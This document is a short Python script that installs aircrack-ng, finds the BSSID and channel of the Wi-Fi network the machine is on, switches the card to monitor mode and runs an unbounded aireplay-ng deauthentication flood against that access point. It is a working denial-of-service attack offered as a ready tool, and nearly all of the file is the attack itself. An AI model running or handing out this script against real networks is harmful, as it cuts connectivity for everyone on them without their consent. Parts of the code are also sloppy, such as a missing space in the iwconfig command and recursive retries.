import os
import time


def main():
    if not os.path.exists("/usr/bin/airmon-ng"):
        os.system("sudo pacman -S aircrack-ng")
        print("airmon-ng installed")
        time.sleep(1)

    connected = os.popen("iwgetid").read()
    if connected == "":
        print("Not connected")
        time.sleep(5)
        main()
    else:
        print(connected)
        interface = connected.split()[0]
        print(interface)
        networkCard = interface.split(":")[0]

    bssid = os.popen("iwgetid -a | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'").read()
    bssid = bssid.splitlines()[0]
    print(bssid)

    channel = os.popen("iwgetid -c")
    # remove everything but the channel number
    channel = channel.read().replace(networkCard + "    Channel:", "")
    try:
        channel = channel.splitlines()[0]
    except:
        print("Error getting channel\nIs it 5GHz?")
        time.sleep(5)
        main()
    print(channel)

    os.system("airmon-ng start " + networkCard)
    os.system("iwconfig " + networkCard + "mon" + " channel " + channel)
    os.system("aireplay-ng -0 0 -a " + bssid + " " + networkCard + "mon")

    os.system("airmon-ng stop " + networkCard + "mon")


def quitProgram():
    print("Exiting")
    quit()


if __name__ == "__main__":
    main()
